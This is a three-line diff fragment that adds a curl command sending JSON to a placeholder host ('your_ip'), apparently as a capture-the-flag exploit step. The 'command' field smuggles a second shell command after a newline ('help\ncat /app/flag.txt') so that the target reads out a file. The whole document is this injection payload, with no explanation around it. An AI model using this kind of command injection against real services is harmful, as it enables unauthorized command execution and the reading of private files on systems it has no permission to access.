@@ -1,0 +1,3 @@
+curl -s http://your_ip/ \
+  -H 'Content-Type: application/json' \
+  -d '{"command":"help\ncat /app/flag.txt"}
